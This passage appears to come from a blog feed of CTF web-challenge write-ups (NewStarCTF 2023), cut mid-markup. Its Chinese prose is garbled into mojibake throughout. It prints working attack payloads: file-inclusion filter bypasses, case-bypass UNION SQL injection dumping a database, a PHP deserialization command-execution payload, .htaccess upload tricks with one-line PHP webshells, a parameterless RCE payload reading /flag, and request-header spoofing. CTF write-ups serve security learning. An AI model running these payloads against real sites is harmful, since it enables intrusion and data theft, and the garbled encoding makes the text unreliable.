class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>include</code>ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p>ä½†æ˜¯<code>!preg_match(&#39;/base|rot/i&#39;,$file)</code>å¦‚æœfileä¸­å«æœ‰baseå’Œrotå°±ä¼šdieï¼Œæ‰€ä»¥ç”¨ä¸äº†æ™®é€šçš„<code>php://filter/read=convert.base64-encode/resource=flag.php</code>å’Œ<code>php://filter/read=string.rot13/resource=flag.php</code></p><p>ä½¿ç”¨å…¶ä»–å­—ç¬¦é›†ï¼Œ<code>php://filter/read=convert.iconv.UTF8.UTF7/resource=flag.php</code>ï¼Œå¾—åˆ°<code>flag+AHs-59c6afe7-3cad-4eb3-abac-38b09521a184+AH0</code></p><p>ç¨åŠ æ”¹åŠ¨ï¼Œå¾—åˆ°flagï¼š<code>flag&#123;59c6afe7-3cad-4eb3-abac-38b09521a184&#125;</code></p><p>è¿™é‡Œè´´ä¸€ä¸ªå­—ç¬¦é›†filterè„šæœ¬ï¼Œ<a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">wupco&#x2F;PHP_INCLUDE_TO_SHELL_CHAR_DICT </a></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°å¥½å¤šaæ ‡ç­¾ï¼Œéšä¾¿ç‚¹ç‚¹ï¼Œå‘ç°æœ‰idå‚æ•°ä¼ å…¥ã€‚</p><p><code>?id=TMP0919&#39;--+</code>å‘ç°ä¾æ—§å¯ä»¥æ˜¾ç¤ºï¼ŒçŒœæµ‹æ˜¯sqlæ³¨å…¥ã€‚</p><p>ä½†æ˜¯<code>?id=TMP0919&#39;or 1=1--+</code>æ˜¾ç¤ºnoï¼Œæœ‰é»‘åå•ï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡ã€‚</p><p><code>?id=TMP0919&#39;Or 1=1--+</code>ç»•è¿‡æˆåŠŸã€‚</p><p><strong>æŸ¥å­—æ®µæ•°</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>TMP0919<span class="string">&#x27; Order by 5--+</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>TMP0919<span class="string">&#x27; Order by 6--+</span></span><br></pre></td></tr></table></figure><p>æ— æ³•å›æ˜¾ï¼Œå¾—åˆ°å­—æ®µæ•°ä¸º5ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>T<span class="string">&#x27; union seLect 1,2,3,4,5--+</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ­£å¸¸å›æ˜¾ã€‚</p><p><strong>æŸ¥åº“å</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>T<span class="string">&#x27; union seLect database(),2,3,4,5--+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾<code>ctf</code>ï¼Œæ³¨æ„selectéœ€è¦ä½¿ç”¨å¤§å°å†™ç»•è¿‡ã€‚</p><p><strong>æŸ¥è¡¨å</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>T<span class="string">&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),3,4,5--+</span></span><br></pre></td></tr></table></figure><p>è¿”å›<code>grades,here_is_flag</code>ï¼Œå‘ç°here_is_flagè¡¨ï¼Œæ³¨æ„information_schemaå’Œwhereéœ€è¦ä½¿ç”¨å¤§å°å†™ç»•è¿‡ã€‚</p><p><strong>æŸ¥åˆ—å</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>T<span class="string">&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),(seLect group_concat(column_name) from infOrmation_schema.columns wHere table_name=&#x27;</span>here_is_flag<span class="string">&#x27; ),4,5--+</span></span><br></pre></td></tr></table></figure><p>è¿”å›<code>flag</code>ï¼Œå¾—åˆ°flagåˆ—</p><p><strong>æŸ¥flag</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>T<span class="string">&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),(seLect group_concat(column_name) from infOrmation_schema.columns wHere table_name=&#x27;</span>here_is_flag<span class="string">&#x27; ),(seLect flag from ctf.here_is_flag),5--+</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>flag&#123;fbbd976e-4244-4154-b2d1-a38dba8a9ef2&#125;</code></p><h2 id="Unserializeï¼Ÿ"><a href="#Unserializeï¼Ÿ" class="headerlink" title="Unserializeï¼Ÿ"></a>Unserializeï¼Ÿ</h2><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°phpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨phpååºåˆ—åŒ–æ¼æ´ï¼Œæœ¬åœ°æ­å»ºphpç¯å¢ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°<code>O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D</code></p><p>ç›´æ¥æ‰“ï¼Œå‘ç°flagè·¯å¾„ï¼š<code>/th1s_1s_fffflllll4444aaaggggg</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;ca&#x27;&#x27;t /th1s_1s_fffflllll4444aaaggggg&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å•å¼•å·ç»•è¿‡è¿‡æ»¤ï¼Œæ‹¿åˆ°<code>O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A36%3A%22ca%27%27t+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D</code></p><p>å¾—åˆ°flagï¼š<code>flag&#123;f1e483d0-09a1-4376-b00b-60b3ea9422df&#125;</code></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p>ä¸Šä¼ phpï¼Œå‘ç°æœ‰é»‘åå•ã€‚</p><p>ç›´æ¥ä¸Šä¼ .htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>å°†jpgè§£æä¸ºphp</p><p>ä¸Šä¼ 1.jpgï¼Œå‘ç°å«æœ‰<code>&lt;?</code>çš„æ–‡ä»¶è¢«è¿‡æ»¤ï¼Œä½¿ç”¨JavaScriptæ ‡ç­¾ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$GET</span>[<span class="number">0</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ­£å¸¸è§£æï¼Œå‰©ä¸‹æ— è„‘ç›´æ¥æ‰¾flagå³å¯ã€‚</p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>æ‰“å¼€å®¹å™¨å‘ç°<code>Welcome To NewstarCTF 2023,Nothing here,or you wanna to find some leaked information?</code></p><p>ä¿¡æ¯æ³„éœ²ï¼ŒçŒœæµ‹æ˜¯gitæ³„éœ²ï¼Œä½¿ç”¨GitHackå·¥å…·</p><p>å¾—åˆ°bo0g1pop.phpï¼Œå†…å®¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æé€»è¾‘ï¼Œæ˜¯æ— å‚æ•°RCEï¼Œä»start.shå¯ä»¥çœ‹åˆ°flagåœ¨<code>/flag</code>ä¸­ã€‚</p><p>é¦–å…ˆéœ€è¦æ„é€ å‡º<code>/flag</code>ï¼Œä½¿ç”¨<code>getallheaders</code>å‡½æ•°å¾—åˆ°æ‰€æœ‰http Header</p><p>å‘ç°User-Agentåœ¨ç¬¬äºŒä¸ªï¼Œå¯ä»¥ä½¿ç”¨<code>next(getallheaders())</code>å¾—åˆ°å€¼ã€‚</p><p>æ”¹UAä¸º&#x2F;flagï¼Œå¾—åˆ°<code>/flag</code>å­—ç¬¦ä¸²ï¼Œæ¥ç€ä½¿ç”¨<code>show_source</code>å‡½æ•°å¾—åˆ°flagå†…å®¹ã€‚</p><p>å®Œæ•´payloadï¼š<code>/bo0g1pop.php?star=show_source(next(getallheaders()));</code></p><p>å¾—åˆ°flagï¼š<code>flag&#123;34b4ffdf-5637-46ee-a734-30e031d0b73f&#125;</code></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è´´ä¸€ä¸ªå®˜æ–¹wpï¼š<a href="https://shimo.im/docs/Dy5ekHJhKo0ap5v3/">https://shimo.im/docs/Dy5ekHJhKo0ap5v3/</a></p><p>å…¶ä»–æ–¹å‘æ²¡æ€ä¹ˆç ”ç©¶ï¼Œå¤ªå¿™äº†ï¼ŒåªæŠ½å‡ºæ¥ä¸€ä¸ªå°æ—¶å†™äº†ä¸ªWeb</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è§£é¢˜ 6&amp;#x2F;6&lt;/p&gt;
&lt;h2 id=&quot;æ¸¸æˆé«˜æ‰‹&quot;&gt;&lt;a href=&quot;#æ¸¸æˆé«˜æ‰‹&quot; class=&quot;headerlink&quot; title=&quot;æ¸¸æˆé«˜æ‰‹&quot;&gt;&lt;/a&gt;æ¸¸æˆé«˜æ‰‹&lt;/h2&gt;&lt;p&gt;æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼ŒF12è¿›è¡Œjavascriptä»£ç å®¡è®¡ã€‚&lt;/p&gt;
&lt;p&gt;å‘</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://blog.lazyforever.top/categories/WriteUp/"/>
    
    
    <category term="web" scheme="https://blog.lazyforever.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>NewStarCTF 2023-WEEK1 WriteUp</title>
    <link href="https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/"/>
    <id>https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/</id>
    <published>2023-09-26T05:33:13.000Z</published>
    <updated>2023-10-02T06:32:39.687Z</updated>
    
    <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡ç¢°ctfäº†ï¼Œæ„Ÿè§‰æ‰‹æœ‰ç‚¹ç”Ÿï¼Œæ­£å¥½æœ€è¿‘newstaræ–°ç”Ÿèµ›ï¼Œè¿‡æ¥å‡‘ä¸ªçƒ­é—¹ã€‚</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>è§£é¢˜ 7&#x2F;7</p><h3 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h3><p>ä»‹ç»é‡Œé¢å†™äº†â€œç²—å¿ƒçš„ç½‘ç«™ç®¡ç†å‘˜æ€»ä¼šæ³„æ¼ä¸€äº›æ•æ„Ÿä¿¡æ¯åœ¨Webæ ¹ç›®å½•ä¸‹â€ï¼Œä¸€çœ¼ä¿¡æ¯æ³„éœ²</p><p>æ‰“å¼€å®¹å™¨ï¼Œå‡ºç°<code>ç²—å¿ƒçš„ç®¡ç†å‘˜æ³„æ¼äº†ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œè¯·ä½ æ‰¾å‡ºä»–æ³„æ¼çš„ä¸¤ä¸ªæ•æ„Ÿä¿¡æ¯ï¼</code>ï¼Œ&#x2F;robots.txtä¸€è¯•ç›´æ¥çˆ†å‡ºflagçš„å‰åŠæ®µï¼Œ&#x2F;<a href="http://www.zipç›´æ¥æŠŠæºç æ³„éœ²äº†./">www.zipç›´æ¥æŠŠæºç æ³„éœ²äº†ã€‚</a></p><p>æ‹¿åˆ°flagï¼š<code>flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</code></p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>ä¸€çœ¼æ–‡ä»¶ä¸Šä¼ ï¼Œå†™ä¸€ä¸ªphpé©¬è¯•ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>å‘ç°æ–‡ä»¶åç¼€æœ‰ç™½åå•ï¼Œä½†æ˜¯éªŒè¯æ˜¯åœ¨å‰ç«¯ï¼Œç›´æ¥burpæŠ“åŒ…æ”¹ä¸€ä¸‹æ–‡ä»¶åå°±èƒ½ç»•</p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°è¦æ±‚è¯·ä½¿ç”¨ GETæ–¹å¼ æ¥ç»™ ctf å‚æ•°ä¼ å…¥ä»»æ„å€¼æ¥é€šè¿‡è¿™å…³</p><p>åŠ ä¸ªå‚æ•°è¯•ä¸€ä¸‹<code>http://node4.buuoj.cn:25055/?ctf=1</code></p><p>å‘ç°<code>å¾ˆæ£’ï¼Œå¦‚æœæˆ‘è¿˜æƒ³è®©ä½ ä»¥POSTæ–¹å¼æ¥ç»™æˆ‘ä¼ é€’ secret å‚æ•°ä½ åˆè¯¥å¦‚ä½•å¤„ç†å‘¢ï¼Ÿ å¦‚æœä½ ä¼ å…¥çš„å‚æ•°å€¼å¹¶ä¸æ˜¯æˆ‘æƒ³è¦çš„secretï¼Œæˆ‘ä¹Ÿä¸ä¼šæ”¾ä½ è¿‡å…³çš„ æˆ–è®¸ä½ å¯ä»¥æ‰¾ä¸€æ‰¾æˆ‘æŠŠsecretè—åœ¨äº†å“ªé‡Œ</code></p><p>ctrl+Uçœ‹ä¸‹æºç ï¼Œå‘ç°æ³¨é‡Š<code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt;</code></p><p>base64è§£ç ä¸€ä¸‹ï¼Œå¾—åˆ°secretæ˜¯n3wst4rCTF2023g00000d</p><p>HackBaræ’ä»¶ä¼ ä¸€ä¸‹POSTå‚æ•°</p><p>æ¥ä¸‹æ¥å‘ç°<code>å¾ˆå¼ºï¼Œç°åœ¨æˆ‘éœ€è¦éªŒè¯ä½ çš„ power æ˜¯å¦æ˜¯ ctfer ï¼Œåªæœ‰ctferå¯ä»¥é€šè¿‡è¿™å…³</code></p><p>Cookieæ”¹ä¸€ä¸‹poweræ”¹ä¸ºctfer</p><p>å‘ç°<code>ä½ å·²ç»å®Œæˆäº†æœ¬é¢˜è¿‡åŠçš„å…³å¡ï¼Œç°åœ¨è¯·ä½¿ç”¨ NewStarCTF2023æµè§ˆå™¨ æ¥é€šè¿‡è¿™å…³ï¼</code></p><p>æŠŠUser-Agentæ”¹ä¸ºNewStarCTF2023</p><p>å‘ç°<code>å¸Œæœ›ä½ æ˜¯ä» newstarctf.com è®¿é—®åˆ°è¿™ä¸ªå…³å¡çš„</code></p><p>åŠ ä¸ªReferer: <code>newstarctf.com</code> </p><p>æœ€åå‘ç°<code>æœ€åä¸€å…³äº†ï¼åªæœ‰ æœ¬åœ°ç”¨æˆ· å¯ä»¥é€šè¿‡è¿™ä¸€å…³</code></p><p>åŠ ä¸€ä¸ªHeaderï¼š<code>X-Real-IP: 127.0.0.1</code>ï¼Œæœ¬æ¥ä»¥ä¸ºè¿™é“é¢˜æ˜¯è¦åŠ X-Forwarded-Forï¼Œç»“æœåŠ X-Forwarded-Forå‘ç°å¥½åƒä¸å¤ªè¡Œ</p><p>æ‹¿åˆ°flagï¼š<code>flag&#123;221fb558-9c0a-4b07-bac6-3af03cf7393e&#125;</code></p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>è¿™é“é¢˜æœ‰ç‚¹å¥‡æ€ªï¼Œçœ‹åˆ°flaskä»¥ä¸ºæ˜¯SSTIï¼Œç»“æœæ‰“å¼€å®¹å™¨éšä¾¿ä¼ ä¸ª<code>number1=&#123;&#123;&#125;&#125;</code>ï¼Œå‘ç°DEBUGæ¨¡å¼æ²¡å…³ï¼Œç»“æœflagç›´æ¥å†™åˆ°æºä»£ç é‡Œç›´æ¥èƒ½çœ‹è§ï¼Œç›´æ¥æ‹¿åˆ°flagï¼š<code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>ä¸Šæ¥å®¹å™¨ç›´æ¥ç»™å‡ºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span 